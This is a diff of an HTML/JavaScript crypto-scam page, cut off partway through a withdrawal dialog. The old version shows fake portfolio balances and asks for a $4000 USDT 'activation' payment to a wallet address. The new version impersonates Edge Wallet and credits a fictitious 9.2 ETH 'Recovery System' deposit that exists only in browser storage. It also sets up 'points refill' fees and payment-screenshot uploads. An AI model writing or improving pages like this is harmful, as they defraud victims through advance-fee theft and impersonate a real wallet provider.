@@ -2,543 +2,871 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Wallet Portfolio</title>
-  <meta name="viewport" content="width=device-width, initial-scale=0.5, maximum-scale=1.0, user-scalable=no">
+  <title>Edge Wallet | Ethereum Pay</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
   <style>
-    body {
-      background: #131313;
-      min-height: 100vh;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      margin: 0;
-      color: #fff;
+    :root {
+      --edge-primary: #0A74DA;
+      --edge-dark: #1D2330;
+      --edge-light: #f3f6fa;
+      --edge-green: #1fd1a4;
+      --edge-red: #e24c4b;
+      --edge-yellow: #ffc400;
+      --card-radius: 18px;
+      --transition: all 0.3s cubic-bezier(.4,0,.2,1);
     }
-    .main-wrap {
-      max-width: 600px;
-      margin: 40px auto;
+    body {
+      margin: 0;
+      padding: 0;
+      background: var(--edge-light);
+      font-family: 'Roboto', Arial, sans-serif;
+      color: var(--edge-dark);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    .centered {
       display: flex;
       flex-direction: column;
-      gap: 28px;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
     }
-    .small-portfolio-card {
+    .edge-card {
+      background: #fff;
+      box-shadow: 0 2px 20px 0 rgba(34,43,61,.11);
+      border-radius: var(--card-radius);
+      padding: 2rem 1.5rem;
+      max-width: 380px;
+      width: 95vw;
+      margin: 1.5rem auto;
+      transition: var(--transition);
+    }
+    .edge-logo {
+      max-width: 70px;
+      margin-bottom: 1.2rem;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    h1, h2, h3, h4 {
+      font-weight: 700;
+      margin: 0.6em 0 0.3em 0;
+      letter-spacing: -.01em;
+    }
+    label {
+      font-weight: 500;
+      margin-top: 1em;
+      display: block;
+      margin-bottom: 0.5em;
+    }
+    input, select {
+      width: 100%;
+      padding: 0.8em 1em;
+      font-size: 1em;
+      border-radius: 9px;
+      border: 1px solid #e6e6e6;
+      margin-bottom: 1em;
+      background-color: #f9f9f9;
+      box-sizing: border-box;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus {
+      border-color: var(--edge-primary);
+    }
+    .button {
+      background: var(--edge-primary);
+      color: #fff;
+      padding: 0.85em 2em;
+      border-radius: 9px;
+      border: none;
+      font-size: 1.1em;
+      font-weight: 700;
+      margin-top: 1em;
+      cursor: pointer;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.07);
+      transition: var(--transition);
+      display: block;
+      width: 100%;
+      outline: none;
+      position: relative;
+      overflow: hidden;
+    }
+    .button:active {
+      background: #064a95;
+    }
+    .button[disabled] {
+      background: #b8cbe7;
+      cursor: not-allowed;
+    }
+    .circle-fingerprint {
+      width: 80px;
+      height: 80px;
+      background: var(--edge-light);
+      border-radius: 50%;
+      border: 3px solid var(--edge-primary);
       display: flex;
       align-items: center;
-      justify-content: flex-start;
-      background: #191919;
-      padding: 14px 20px 14px 12px;
-      border-radius: 14px;
-      box-shadow: 0 2px 14px 0 rgba(0,0,0,0.13);
-      max-width: 340px;
-      margin: 0 auto 0 0;
+      justify-content: center;
+      margin: 1.2em auto 1em auto;
+      box-shadow: 0 0 0 2px #e6eaff;
+      transition: background 0.2s;
+      position: relative;
+      cursor: pointer;
+      overflow: hidden;
     }
-    .portfolio-photo {
+    .circle-fingerprint img {
+      width: 38px;
+      height: 38px;
+      opacity: 0.85;
+      pointer-events: none;
+    }
+    .hold-progress {
+      position: absolute;
+      bottom: 0; left: 0; right: 0;
+      height: 0;
+      background: var(--edge-green);
+      border-radius: 0 0 50% 50%;
+      transition: height .2s;
+      opacity: 0.6;
+    }
+    .touch-label {
+      text-align: center;
+      font-size: 1.08em;
+      color: #757575;
+      margin-top: 0.5em;
+    }
+    .notification {
+      background: var(--edge-yellow);
+      color: #212121;
+      border-radius: 0 0 18px 18px;
+      padding: 1.1em 1em 1em 2.2em;
+      position: relative;
+      font-size: 1.02em;
+      box-shadow: 0 2px 10px rgba(255,204,0,0.08);
+      margin: 0 auto 1em auto;
+      max-width: 400px;
+    }
+    .notification strong {
+      font-weight: 700;
+    }
+    .notification .close {
+      position: absolute;
+      right: 1em;
+      top: 1em;
+      font-size: 1.2em;
+      color: #444;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .dashboard-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: .3em;
+    }
+    .eth-balance {
+      font-size: 2.4em;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      color: #1fd1a4;
+      margin: 0.2em 0 0.1em 0;
+      text-shadow: 0 2px 8px #f6fcfa;
+    }
+    .currency-label {
+      font-size: 1.1em;
+      color: #444;
+      font-weight: 500;
+    }
+    .dashboard-img {
+      width: 100%;
+      border-radius: var(--card-radius);
+      margin: 1em 0;
+      object-fit: cover;
+      box-shadow: 0 1px 8px 0 rgba(34,43,61,.07);
+      background: #111;
+    }
+    .withdraw-section {
+      margin-top: 2em;
+    }
+    .withdraw-label {
+      font-size: 1.1em;
+      margin-bottom: 0.6em;
+      color: #3a3a3a;
+    }
+    .progress-bar {
+      height: 20px;
+      background: #e6e6e6;
+      border-radius: 6px;
+      overflow: hidden;
+      margin-top: 1em;
+      margin-bottom: .8em;
+      width: 100%;
+    }
+    .progress-bar-inner {
+      height: 100%;
+      background: var(--edge-primary);
+      transition: width 0.7s cubic-bezier(.4,0,.2,1);
+      width: 1%;
+    }
+    .error-msg {
+      color: var(--edge-red);
+      background: #ffeaea;
+      border-radius: 8px;
+      padding: 0.9em 1em;
+      margin-top: 1em;
+      font-size: 1.06em;
+      text-align: center;
+    }
+    .store-list {
+      display: flex;
+      flex-direction: column;
+      gap: 1em;
+      margin: 1em 0;
+    }
+    .store-btn {
+      background: #f4f4f9;
+      border: 1.5px solid #e6e6ef;
+      border-radius: 10px;
+      padding: 1.2em 1em;
+      display: flex;
+      align-items: center;
+      font-size: 1.08em;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background .15s;
+      outline: none;
+      gap: .7em;
+      justify-content: space-between;
+    }
+    .store-btn.online {
+      border-color: var(--edge-green);
+      background: #eafff8;
+      color: #157b6a;
+    }
+    .store-btn.offline {
+      border-color: #ffb3b3;
+      color: #b15050;
+      background: #fff7f7;
+    }
+    .copy-btn {
+      background: var(--edge-light);
+      color: var(--edge-primary);
+      border: 1px solid var(--edge-primary);
+      padding: 0.5em 1.2em;
+      border-radius: 7px;
+      font-size: 1em;
+      font-weight: 500;
+      margin-left: 1em;
+      cursor: pointer;
+      outline: none;
+      transition: background .15s;
+    }
+    .copy-btn:active {
+      background: #def2ff;
+    }
+    .upload-section {
+      text-align: center;
+      margin-top: 1.5em;
+    }
+    .support-link {
+      margin-top: 1.7em;
+      text-align: center;
+    }
+    .support-link a {
+      color: var(--edge-primary);
+      text-decoration: underline;
+      font-weight: 600;
+      font-size: 1.1em;
+    }
+    @media (max-width: 500px) {
+      .edge-card { padding: 1.2rem 0.7rem; }
+      .notification { padding: 0.9em 0.7em 0.8em 1.4em; }
+      .dashboard-header h2 { font-size: 1.15em; }
+      .store-btn { font-size: 0.98em; padding: 1em .7em;}
+    }
+    /* Floating support button */
+    #support-float-btn {
+      position: fixed;
+      right: 18px;
+      bottom: 22px;
+      z-index: 9999;
+      background: #0A74DA;
+      color: #fff;
+      border-radius: 50%;
       width: 56px;
       height: 56px;
-      border-radius: 50%;
-      object-fit: cover;
-      border: 3px solid #f5c339;
-      background: #222;
-      margin-right: 18px;
-      flex-shrink: 0;
-    }
-    .portfolio-mini-table {
-      border-collapse: collapse;
-      font-size: 0.97rem;
-      color: #fff;
-    }
-    .portfolio-mini-table td {
-      padding: 3px 7px 3px 0;
-      font-weight: 500;
-      border: none;
-    }
-    .portfolio-mini-table .label {
-      color: #f5c339;
-      font-weight: 600;
-      padding-right: 9px;
-      min-width: 90px;
-    }
-    .portfolio-mini-table .value {
-      color: #fff;
-      font-weight: 400;
-    }
-    @media (max-width: 650px) {
-      .main-wrap, .portfolio-section, .gif-section, .token-table-section {
-        max-width: 99vw;
-      }
-      .portfolio-content {
-        padding: 22px 6vw 18px 6vw;
-      }
-      .wallet-btn {
-        padding: 11px 16vw;
-        font-size: 1em;
-      }
-      .gif-section img {
-        width: 100vw;
-        max-width: 99vw;
-      }
-      .deposit-card, .error-popup {
-        min-width: 90vw;
-        padding-left: 6vw;
-        padding-right: 6vw;
-      }
-      .small-portfolio-card {
-        max-width: 99vw;
-        padding: 12px 6vw 12px 6vw;
-      }
-      .portfolio-photo {
-        width: 48px;
-        height: 48px;
-        margin-right: 11px;
-      }
-      .portfolio-mini-table .label {
-        min-width: 70px;
-      }
-    }
-    .portfolio-section {
-      width: 100%;
-      max-width: 600px;
-      min-width: 0;
-      min-height: 210px;
-      border-radius: 12px;
-      box-shadow: 0 4px 30px 0 rgba(0,0,0,0.20);
-      position: relative;
-      overflow: hidden;
-      /* background: url('IMG_0146.jpeg"') center center/cover no-repeat; */
-      background: url('IMG_0146.jpeg"') center center/cover no-repeat;
       display: flex;
-      flex-direction: column;
+      align-items: center;
       justify-content: center;
-      align-items: stretch;
-      padding: 0;
-    }
-    .portfolio-overlay {
-      background: rgba(19,19,19, 0.85);
-      width: 100%;
-      height: 100%;
-      position: absolute;
-      z-index: 1;
-      top: 0; left: 0;
-    }
-    .portfolio-content {
-      position: relative;
-      z-index: 2;
-      padding: 32px 32px 24px 32px;
-      display: flex;
-      flex-direction: column;
-      align-items: stretch;
-    }
-    .portfolio-title {
-      font-size: 1.1rem;
-      margin-bottom: 8px;
-      letter-spacing: 1px;
-      color: #f5c339;
-      font-weight: 600;
-    }
-    .portfolio-balance {
-      font-size: 2.3rem;
-      font-weight: bold;
-      color: #fff;
-      margin-bottom: 18px;
-      letter-spacing: 1px;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.14);
-    }
-    .wallet-buttons {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 0;
-      width: 100%;
-      margin-top: 8px;
-    }
-    .wallet-btn {
-      padding: 12px 36px;
-      font-size: 1.08rem;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: 600;
-      background: #f5c339;
-      color: #131313;
-      transition: background 0.2s, color 0.2s;
-      box-shadow: 0 2px 8px rgba(245,195,57,0.10);
-    }
-    .wallet-btn.withdraw {
-      background: #232323;
-      color: #f5c339;
-      border: 1.5px solid #f5c339;
-    }
-    .wallet-btn:active {
-      filter: brightness(0.93);
-    }
-    .gif-section {
-      width: 100%;
-      max-width: 600px;
-      border-radius: 12px;
-      overflow: hidden;
-      background: #191919;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      box-shadow: 0 4px 18px 0 rgba(0,0,0,0.15);
-      padding: 0;
-      margin: 0;
-    }
-    .gif-section img {
-      display: block;
-      width: 100%;
-      max-width: 600px;
-      height: auto;
-      border-radius: 12px;
-      background: #191919;
-    }
-    .token-table-section {
-      width: 100%;
-      max-width: 600px;
-      margin: 0;
-      background: #181818;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 4px 18px 0 rgba(0,0,0,0.12);
-      padding: 0;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      background: none;
-      font-size: 1rem;
-    }
-    thead {
-      background: #181818;
-    }
-    th, td {
-      padding: 13px 12px;
-      font-size: 1rem;
-      font-weight: 500;
-    }
-    th {
-      color: #f5c339;
-      font-weight: 700;
-      background: #232323;
-      border-bottom: 2px solid #282828;
-      letter-spacing: 0.03em;
-    }
-    tr:not(:last-child) td {
-      border-bottom: 1px solid #232323;
-    }
-    td, th {
-      vertical-align: middle;
-    }
-    th:first-child, td:first-child {
-      text-align: left;
-      width: 38%;
-    }
-    th:nth-child(2), td:nth-child(2) {
-      text-align: center;
-      width: 32%;
-    }
-    th:last-child, td:last-child {
-      text-align: right;
-      width: 30%;
-    }
-    /* Modal overlays */
-    .deposit-page,
-    .error-popup-bg {
-      display: flex;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(19,19,19,0.90);
-      z-index: 100;
-      justify-content: center;
-      align-items: center;
-    }
-    .hidden {
-      display: none !important;
-    }
-    .deposit-card {
-      background: #222;
-      border-radius: 18px;
-      padding: 32px 20px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.28);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-width: 320px;
-    }
-    .deposit-card img {
-      width: 150px;
-      height: 150px;
-      object-fit: contain;
-      margin-bottom: 22px;
-      border-radius: 12px;
-      background: #191919;
-      box-shadow: 0 2px 8px rgba(245,195,57,0.10);
-    }
-    .deposit-desc {
-      font-size: 1.16rem;
-      color: #f5c339;
-      margin-bottom: 8px;
-      text-align: center;
-      font-weight: 500;
-    }
-    .deposit-close {
-      margin-top: 20px;
-      padding: 10px 36px;
-      background: #f5c339;
-      color: #222;
-      border: none;
-      border-radius: 6px;
-      font-weight: 600;
-      font-size: 1rem;
-      cursor: pointer;
-    }
-    .error-popup-bg {
-      background: rgba(0,0,0,0.60);
-      z-index: 200;
-    }
-    .error-popup {
-      background: #232323;
-      color: #f5c339;
-      border-radius: 14px;
-      padding: 32px 20px 20px 20px;
-      box-shadow: 0 2px 24px rgba(245,195,57,0.08);
-      min-width: 320px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      position: relative;
-    }
-    .error-title {
-      font-size: 1.28rem;
-      font-weight: bold;
-      margin-bottom: 14px;
-      text-align: center;
-    }
-    .error-desc {
-      font-size: 1rem;
-      margin-bottom: 24px;
-      text-align: center;
-    }
-    .error-actions {
-      display: flex;
-      gap: 14px;
-      margin-top: 8px;
-    }
-    .error-btn {
-      padding: 9px 30px;
-      font-size: 1rem;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
-      background: #f5c339;
-      color: #222;
+      font-size: 2em;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.14);
+      text-decoration: none;
       transition: background 0.2s;
+      cursor: pointer;
     }
-    .error-btn.secondary {
-      background: #232323;
-      color: #f5c339;
-      border: 1.5px solid #f5c339;
-    }
-    /* --- Custom for image at page bottom --- */
-    .bottom-image-section {
-      width: 100%;
-      max-width: 600px;
-      margin: 38px auto 0 auto;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      border-radius: 14px;
-      background: #191919;
-      padding: 20px 0 24px 0;
-      box-shadow: 0 2px 14px 0 rgba(0,0,0,0.12);
-    }
-    .bottom-image-section img {
-      width: 100%;
-      max-width: 600px;
-      height: auto;
-      border-radius: 10px;
-      object-fit: contain;
-      display: block;
-      background: #181818;
-    }
-    .bottom-image-section .bottom-caption {
-      margin-top: 14px;
-      color: #f5c339;
-      font-size: 1.12rem;
-      font-weight: 600;
-      text-align: center;
-      letter-spacing: 1px;
-    }
-    @media (max-width: 650px) {
-      .bottom-image-section img {
-      width: 100%;
-      max-width: 600px;
-      }
-      .bottom-image-section {
-       max-width: 600px;
-        padding: 10px 0 12px 0;
-      }
+    #support-float-btn:hover {
+      background: #195593;
     }
   </style>
 </head>
 <body>
-  <div class="main-wrap">
-    <!-- Small Portfolio Card at the Top -->
-    <div class="small-portfolio-card">
-      <img class="portfolio-photo" src="IMG_0234.jpeg" alt="User Photo" />
-      <table class="portfolio-mini-table">
-        <tr>
-          <td class="label">USER ID</td>
-          <td class="value"><b>@Jasper-1179</b></p></td>
-        </tr>
-      </table>
-    </div>
-  <div class="main-wrap">
-    <!-- Small Portfolio Card at the Top -->
-    <div class="small-portfolio-card">
-      <img class="portfolio-photo" src="IMG_0163.jpeg" alt="User Photo" />
-      <table class="portfolio-mini-table">
-        <tr>
-          <td class="label">Registered ID</td>
-          <td class="value">GAL GADOT</td>
-        </tr>
-        <tr>
-          <td class="label">Referral Code</td>
-          <td class="value">YESIRA</td>
-        </tr>
-      </table>
-      </div>
-    
-     <!-- Portfolio Section with background image and overlay -->
-    <div class="portfolio-section">
-      <div class="portfolio-overlay"></div>
-      <div class="portfolio-content">
-        <div class="portfolio-title">GAL GADOT <b>TEAM</b> Portfolio Balance</div>
-        <div id="portfolio-balance-amount" class="portfolio-balance">$600,487.28</div>
-        <div class="wallet-buttons">
-          <button class="wallet-btn" id="startup-btn">Start up</button>
-          <button class="wallet-btn withdraw" id="withdraw-btn">Withdrawal</button>
-        </div>
-      </div>
-    </div>
-    <!-- GIF Section -->
-    <div class="gif-section">
-      <img src="IMG_0189.jpeg" alt="Wallet Overview" />
-    </div>
-    
+<div id="app"></div>
+<!-- Floating Support Button -->
+<a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" 
+   target="_blank" 
+   id="support-float-btn" 
+   title="Live Support">
+  💬
+</a>
+<script>
+/* --- GLOBALS --- */
+const SUPPORTED_COUNTRY = "United States";
+const SUPPORTED_FLAG = "🇺🇸";
+const SUPPORTED_ETH = "0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc";
+const DEPOSIT_AMOUNT = 30000;
+const DEPOSIT_ETH = 9.2;
+const BINANCE_POINTS_NEEDED = 3000;
+const BINANCE_POINTS_REFILL_COST = 280;
+const REFILL_ADDRESS = "0xe30Ac60E1bEBe1A23A3B16548067d062c78DEBC4";
 
-    <!-- GIF Section -->
-    <div class="gif-section">
-      <img src="IMG_0230.jpeg" alt="Wallet Overview" />
-    </div>
+const EDGE_LOGO_URL = "https://edge.app/_nuxt/img/edge-logo.7e5c3b2.svg";
+const FINGERPRINT_IMG = "https://cdn-icons-png.flaticon.com/512/3602/3602123.png";
+// Use the uploaded image for the dashboard
+const DASHBOARD_IMG = "image1"; // Use your uploaded dashboard image as the dashboard
 
-   <!-- Token Table Section -->
-    <div class="token-table-section">
-      <table>
-        <thead>
-          <tr>
-            <th>Token</th>
-            <th>Available Balance</th>
-            <th>Price</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>USDT</td>
-            <td>100,000</td>
-            <td>$1.00</td>
-          </tr>
-          <tr>
-            <td>BTC</td>
-            <td>3.82073129</td>
-            <td>$105,607.87</td>
-          </tr>
-          <tr>
-            <td>SOLANA</td>
-            <td>0.00</td>
-            <td>$154.05</td>
-          </tr>
-          <tr>
-            <td>BNB</td>
-            <td>0.00</td>
-            <td>$650.38</td>
-          </tr>
-          <tr>
-            <td>ETH</td>
-            <td>39.63</td>
-            <td>$2,512.68</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
+const SUPPORT_URL = "https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings";
 
-      <!-- GIF Section -->
-    <div class="gif-section">
-      <img src="IMG_1235.jpeg" alt="Wallet Overview" />
-       </div>
-    <!-- Bottom image section (the image you want displayed at the last part of the page) -->
-      <img src="IMG_0142.jpeg" alt="All Right Serve" />
-  <!-- Start Up Modal -->
-  <div class="deposit-page hidden" id="startup-modal">
-    <div class="deposit-card">
-      <img src="IMG_1089.jpeg" alt="Deposit Wallet">
-      <div class="deposit-desc">SET up your wallet TO access referral balance.</div>
-      <div class="error-desc">Access your referral balance now. <b>Minimum to activate: $4000 USDT</b> [ TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF ]</div>
-      <button class="deposit-close" id="startup-close">Close</button>
-    </div>
-  </div>
-  <!-- Invalid User Modal -->
-  <div class="error-popup-bg hidden" id="invalid-user-popup">
-    <div class="error-popup">
-      <div class="error-title">Invalid User Start up</div>
-      <div class="error-desc">Access Referral Balance</div>
-      <div class="error-actions">
-        <button class="error-btn" id="activate-now-btn">Activate now</button>
-        <button class="error-btn secondary" id="close-error-btn">Close</button>
-      </div>
-    </div>
-  </div>
-  <script>
-    document.getElementById('portfolio-balance-amount').textContent = '$600,487.28';
-    const startupBtn = document.getElementById('startup-btn');
-    const withdrawBtn = document.getElementById('withdraw-btn');
-    const startupModal = document.getElementById('startup-modal');
-    const startupClose = document.getElementById('startup-close');
-    const invalidUserPopup = document.getElementById('invalid-user-popup');
-    const activateNowBtn = document.getElementById('activate-now-btn');
-    const closeErrorBtn = document.getElementById('close-error-btn');
+/* --- STATE --- */
+let state = {
+  step: "country",
+  name: "",
+  country: SUPPORTED_COUNTRY,
+  eth: SUPPORTED_ETH,
+  balance: 0,
+  depositAccepted: false,
+  withdrawAddress: "",
+  withdrawProgress: 0,
+  withdrawError: false,
+  points: 0,
+  storeStatus: { online: true, offline: [true, true] },
+  refillCopied: false,
+  paymentScreenshot: null,
+  noticeClosed: false,
+  depositNotified: false,
+  depositNotificationShown: false,
+  dashboardUnlocked: false,
+  depositConfirmed: false
+};
 
-    // "Start up" button opens start up modal
-    startupBtn.onclick = function(e) {
-      startupModal.classList.remove('hidden');
-    };
-    // Withdrawal button opens invalid user modal
-    withdrawBtn.onclick = function(e) {
-      invalidUserPopup.classList.remove('hidden');
-    };
-    // Close start up modal
-    startupClose.onclick = function(e) {
-      startupModal.classList.add('hidden');
-    };
-    // Activate now redirects to start up modal
-    activateNowBtn.onclick = function(e) {
-      invalidUserPopup.classList.add('hidden');
-      startupModal.classList.remove('hidden');
-    };
-    // Close invalid user popup
-    closeErrorBtn.onclick = function(e) {
-      invalidUserPopup.classList.add('hidden');
-    };
-    // Allow clicking outside modal to close
-    window.onclick = function(e) {
-      if (e.target === startupModal) {
-        startupModal.classList.add('hidden');
+/* --- PERSISTENCE --- */
+function saveState() {
+  localStorage.setItem('edgeWalletAppState', JSON.stringify(state));
+}
+function loadState() {
+  const s = localStorage.getItem('edgeWalletAppState');
+  if (s) {
+    try { state = Object.assign(state, JSON.parse(s)); } catch(e){}
+  }
+}
+
+/* --- UI RENDER --- */
+function render() {
+  const app = document.getElementById('app');
+  app.innerHTML = '';
+
+  // Step Switch
+  if (!state.dashboardUnlocked) {
+    switch(state.step) {
+      case "country": return renderCountry(app);
+      case "touch": return renderTouch(app);
+      case "welcome": return renderWelcome(app);
+      case "deposit": return renderDeposit(app);
+    }
+  }
+  if (state.dashboardUnlocked) {
+    renderDashboard(app);
+    if (state.depositNotificationShown && !state.noticeClosed) renderDepositNotice(app);
+    if (state.step === "withdraw") renderWithdrawModal(app);
+    if (state.step === "withdraw-progress") renderWithdrawProgress(app);
+    if (state.withdrawError && state.step !== "points" && state.step !== "withdraw-progress") renderWithdrawError(app);
+    if (state.step === "points") renderPointsModal(app);
+    if (state.step === "refill") renderRefillModal(app);
+    if (state.step === "await-payment") renderAwaitPaymentModal(app);
+    if (state.step === "upload") renderUploadModal(app);
+    if (state.step === "support") renderSupportModal(app);
+  }
+}
+
+/* --- COMPONENTS --- */
+function renderCountry(app) {
+  const card = document.createElement('div');
+  card.className = 'edge-card centered';
+
+  card.innerHTML = `
+    <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
+    <h2>Welcome to Edge Wallet</h2>
+    <form id="countryForm" autocomplete="off">
+      <label for="country">Confirm your country</label>
+      <select id="country" name="country" required>
+        <option value="${SUPPORTED_COUNTRY}" selected>${SUPPORTED_COUNTRY} ${SUPPORTED_FLAG}</option>
+      </select>
+      <label for="name">Enter your name</label>
+      <input type="text" id="name" name="name" placeholder="Full Name" required maxlength="24" autocomplete="off" value="${state.name}">
+      <label for="eth">ETH Address</label>
+      <input type="text" id="eth" name="eth" placeholder="Enter your ETH address" required pattern="^0x[a-fA-F0-9]{40}$" value="${state.eth}">
+      <div style="color: #b15050; font-size:0.98em; margin-bottom:.5em; display:none;" id="ethError">Please enter the supported ETH address.</div>
+      <button class="button" style="margin-top:1em;" type="submit">Continue</button>
+    </form>
+  `;
+  app.appendChild(card);
+
+  // Validation
+  const form = card.querySelector('#countryForm');
+  const ethInput = card.querySelector('#eth');
+  const ethError = card.querySelector('#ethError');
+  form.onsubmit = function(e) {
+    e.preventDefault();
+    if (ethInput.value.trim() !== SUPPORTED_ETH) {
+      ethError.style.display = 'block';
+      ethInput.focus();
+      return;
+    } else {
+      ethError.style.display = 'none';
+    }
+    state.name = form.name.value.trim();
+    state.eth = ethInput.value.trim();
+    state.country = form.country.value;
+    state.step = "touch";
+    saveState();
+    render();
+  };
+}
+
+function renderTouch(app) {
+  const card = document.createElement('div');
+  card.className = 'edge-card centered';
+  card.innerHTML = `
+    <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
+    <h2>Touch &amp; Hold to Proceed</h2>
+    <div class="circle-fingerprint" id="touchBtn" tabindex="0">
+      <img src="${FINGERPRINT_IMG}" alt="Fingerprint">
+      <div class="hold-progress" id="holdProgress"></div>
+    </div>
+    <div class="touch-label">Touch and hold for 2 seconds</div>
+  `;
+  app.appendChild(card);
+
+  let holdTimeout, holdProgress;
+  const btn = card.querySelector('#touchBtn');
+  const progress = card.querySelector('#holdProgress');
+  function startHold() {
+    let step = 0;
+    progress.style.height = "0";
+    holdProgress = setInterval(() => {
+      step += 40;
+      progress.style.height = (step/20) + "%";
+      if (step >= 2000) {
+        clearInterval(holdProgress);
+        state.step = "welcome";
+        saveState();
+        render();
       }
-      if (e.target === invalidUserPopup) {
-        invalidUserPopup.classList.add('hidden');
+    }, 40);
+    holdTimeout = setTimeout(() => {
+      clearInterval(holdProgress);
+      state.step = "welcome";
+      saveState();
+      render();
+    }, 2000);
+  }
+  function stopHold() {
+    clearInterval(holdProgress);
+    clearTimeout(holdTimeout);
+    progress.style.height = "0";
+  }
+  btn.addEventListener('mousedown', startHold);
+  btn.addEventListener('touchstart', startHold);
+  btn.addEventListener('mouseup', stopHold);
+  btn.addEventListener('mouseleave', stopHold);
+  btn.addEventListener('touchend', stopHold);
+  btn.addEventListener('touchcancel', stopHold);
+}
+
+function renderWelcome(app) {
+  const card = document.createElement('div');
+  card.className = 'edge-card centered';
+  card.innerHTML = `
+    <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
+    <h2 style="margin-top:0.5em; font-size:1.2em;">WELCOME TO ETHEREUM PAY</h2>
+    <div style="font-size:1.06em; color:#666; margin-bottom:1.2em;">SUPPORTED BY EDGE WALLET</div>
+    <button class="button" id="goDashboard">Go to Dashboard</button>
+  `;
+  app.appendChild(card);
+  card.querySelector('#goDashboard').onclick = () => {
+    state.step = "deposit";
+    saveState();
+    render();
+  };
+}
+
+function renderDeposit(app) {
+  const card = document.createElement('div');
+  card.className = 'edge-card centered';
+  card.innerHTML = `
+    <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
+    <h2 style="font-size:1.15em;">Deposit Confirmation</h2>
+    <div style="margin:1em 0 1.2em 0; font-size:1.1em;">
+      Dear <strong>${state.name}</strong>,<br>
+      Before entering the dashboard, you have an incoming deposit of <strong>${DEPOSIT_ETH} ETHEREUM</strong> ($${DEPOSIT_AMOUNT.toLocaleString()}) from <b>RECOVERY SYSTEM</b>.
+    </div>
+    <button class="button" id="acceptDeposit">Accept Deposit</button>
+  `;
+  app.appendChild(card);
+  card.querySelector('#acceptDeposit').onclick = () => {
+    state.depositAccepted = true;
+    state.depositNotificationShown = true;
+    state.balance = DEPOSIT_AMOUNT;
+    state.dashboardUnlocked = true;
+    state.step = "dashboard";
+    saveState();
+    render();
+  };
+}
+
+function renderDepositNotice(app) {
+  if (!state.depositNotified) {
+    setTimeout(() => { state.depositNotified = true; saveState(); render(); }, 1000);
+    return;
+  }
+  const notif = document.createElement('div');
+  notif.className = 'notification';
+  notif.innerHTML = `
+    <strong>Deposit Successful:</strong><br>
+    You have received <b>${DEPOSIT_ETH} ETH</b> ($${DEPOSIT_AMOUNT.toLocaleString()}) from <b>Recovery System</b>.<br>
+    Thank you for using Edge Wallet.
+    <button class="close" id="closeNotice">&times;</button>
+  `;
+  notif.style.position = "fixed";
+  notif.style.top = 0;
+  notif.style.left = "50%";
+  notif.style.transform = "translateX(-50%)";
+  notif.style.zIndex = 100;
+  notif.style.maxWidth = "400px";
+  notif.style.width = "90vw";
+  app.appendChild(notif);
+  notif.querySelector('#closeNotice').onclick = () => {
+    state.noticeClosed = true;
+    saveState();
+    render();
+  };
+}
+
+function renderDashboard(app) {
+  const card = document.createElement('div');
+  card.className = 'edge-card';
+  card.style.position = "relative";
+
+  card.innerHTML = `
+    <div class="dashboard-header">
+      <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet" style="margin-bottom:0;">
+      <h2>Edge Wallet Dashboard</h2>
+    </div>
+    <img src="${DASHBOARD_IMG}" alt="Dashboard" class="dashboard-img">
+    <div class="eth-balance">$${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}</div>
+    <div class="currency-label">Currency Holding: Ethereum (${DEPOSIT_ETH} ETH)</div>
+    <div class="withdraw-section">
+      <button class="button" id="withdrawBtn">Withdraw</button>
+    </div>
+  `;
+  app.appendChild(card);
+
+  card.querySelector('#withdrawBtn').onclick = () => {
+    state.step = "withdraw";
+    render();
+  };
+}
+
+function renderWithdrawModal(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 200;
+  modal.style.maxWidth = "370px";
+  modal.innerHTML = `
+    <h3>Confirm Withdrawal</h3>
+    <div style="font-size:1.05em; margin-bottom:.7em;">
+      I confirm that I am the rightful owner of this payment and I agree that the $${DEPOSIT_AMOUNT.toLocaleString()} (${DEPOSIT_ETH} Ethereum) should be forwarded to my ETH address.
+    </div>
+    <label for="withdrawAddr">ETH Address</label>
